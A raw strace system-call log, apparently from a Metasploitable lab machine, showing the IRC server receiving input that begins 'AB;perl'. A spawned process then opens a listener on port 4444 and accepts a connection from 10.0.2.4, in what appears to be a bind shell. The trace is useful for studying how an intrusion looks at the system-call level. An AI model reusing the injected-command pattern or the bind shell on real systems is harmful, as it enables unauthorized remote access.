10196 07:31:51.015449 stat64("/usr/lib/tls/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015461 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015473 stat64("/usr/lib/tls/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015484 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015496 stat64("/usr/lib/tls/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015507 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015520 stat64("/usr/lib/tls/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015531 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015543 stat64("/usr/lib/tls/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015554 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015566 stat64("/usr/lib/tls/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015577 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015588 stat64("/usr/lib/tls", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015599 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015612 stat64("/usr/lib/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015623 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015636 stat64("/usr/lib/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015647 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015659 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015676 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015688 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015705 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015717 stat64("/usr/lib/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015728 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015740 stat64("/usr/lib/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015751 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015763 stat64("/usr/lib/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015774 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015785 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
10196 07:31:51.015802 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015822 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015837 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015877 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015910 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015924 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015936 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015948 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015960 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015973 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015985 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015998 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016010 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016022 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016034 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016046 stat64("/lib/i486-linux-gnu/tls", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016058 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016071 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016083 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016096 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016108 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016121 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016133 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016145 stat64("/lib/i486-linux-gnu/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016157 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016169 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016181 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016194 stat64("/lib/i486-linux-gnu/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016205 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016218 stat64("/lib/i486-linux-gnu/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016229 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016241 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.016258 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016273 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016286 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016299 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016311 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016335 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016376 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016390 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016416 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016429 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016442 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016455 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016467 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016480 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016492 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016505 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016516 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016529 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016542 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016555 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016567 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016580 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016592 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016605 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016617 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016630 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016642 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016655 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016666 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016679 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.016691 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.016703 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.016722 munmap(0xb7d29000, 29913) = 0
10196 07:31:51.016742 open("/etc/ld.so.cache", O_RDONLY) = 6
10196 07:31:51.016755 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10196 07:31:51.016771 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d29000
10196 07:31:51.016781 close(6)          = 0
10196 07:31:51.016792 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10196 07:31:51.016807 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
10196 07:31:51.016909 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10196 07:31:51.017064 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10196 07:31:51.017086 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d1e000
10196 07:31:51.017098 mmap2(0xb7d27000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d27000
10196 07:31:51.017115 close(6)          = 0
10196 07:31:51.017138 munmap(0xb7d29000, 29913) = 0
10196 07:31:51.017155 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10196 07:31:51.017173 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10196 07:31:51.017188 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10196 07:31:51.017205 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d30000
10196 07:31:51.017215 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10196 07:31:51.017441 close(6)          = 0
10196 07:31:51.017467 munmap(0xb7d30000, 4096) = 0
10196 07:31:51.017486 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10196 07:31:51.017501 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10196 07:31:51.017518 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d30000
10196 07:31:51.017530 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10196 07:31:51.017715 close(6)          = 0
10196 07:31:51.017725 munmap(0xb7d30000, 4096) = 0
10196 07:31:51.017751 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
10196 07:31:51.017772 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc575f8) = -1 EINVAL (Invalid argument)
10196 07:31:51.017786 _llseek(6, 0, 0xbfc57640, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.017797 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc575f8) = -1 EINVAL (Invalid argument)
10196 07:31:51.017808 _llseek(6, 0, 0xbfc57640, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.017817 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
10196 07:31:51.017871 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
10196 07:31:51.017945 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
10196 07:31:51.017992 listen(6, 5)      = 0
10196 07:31:51.018062 accept(6,  <unfinished ...>
10195 07:31:51.018288 exit_group(0)     = ?
10193 07:31:51.018363 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10195
10193 07:31:51.018378 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:51.018404 --- SIGCHLD (Child exited) @ 0 (0) ---
10193 07:31:51.018440 waitpid(-1, 0xbf918c88, WNOHANG) = -1 ECHILD (No child processes)
10193 07:31:51.018451 sigreturn()       = ? (mask now [])
10193 07:31:51.018484 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10193 07:31:51.018605 exit_group(0)     = ?
4519  07:31:51.018710 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10193
4519  07:31:51.018736 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:31:51.018769 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:31:51.018780 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:31:51.018790 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:31:51.018825 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:31:51.019060 gettimeofday({1495625511, 19080}, NULL) = 0
4519  07:31:51.019109 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [4], left {1, 0})
4519  07:31:51.019168 clock_gettime(CLOCK_MONOTONIC, {2320, 836181671}) = 0
4519  07:31:51.019183 recv(4, "PRIVMSG  #testit BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 58
4519  07:31:51.019267 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019303 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019317 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019332 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019345 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019359 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019372 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019401 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019441 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019472 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019485 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019499 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019512 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019525 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019538 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019552 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019565 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019578 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019591 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019606 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019620 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019633 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 400000}, ...}) = 0
4519  07:31:51.019651 time(NULL)        = 1495625511
4519  07:31:51.019664 time(NULL)        = 1495625511
4519  07:31:51.019682 gettimeofday({1495625511, 19686}, NULL) = 0
4519  07:31:51.019693 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:31:51.019721 clock_gettime(CLOCK_MONOTONIC, {2320, 836734040}) = 0
4519  07:31:51.019731 gettimeofday({1495625511, 19735}, NULL) = 0
4519  07:31:51.019742 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
10196 07:31:51.372313 <... accept resumed> {sa_family=AF_INET, sin_port=htons(42639), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
10196 07:31:51.372354 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc565e8) = -1 EINVAL (Invalid argument)
10196 07:31:51.372369 _llseek(8, 0, 0xbfc56630, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.372381 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc565e8) = -1 EINVAL (Invalid argument)
10196 07:31:51.372391 _llseek(8, 0, 0xbfc56630, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10196 07:31:51.372401 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
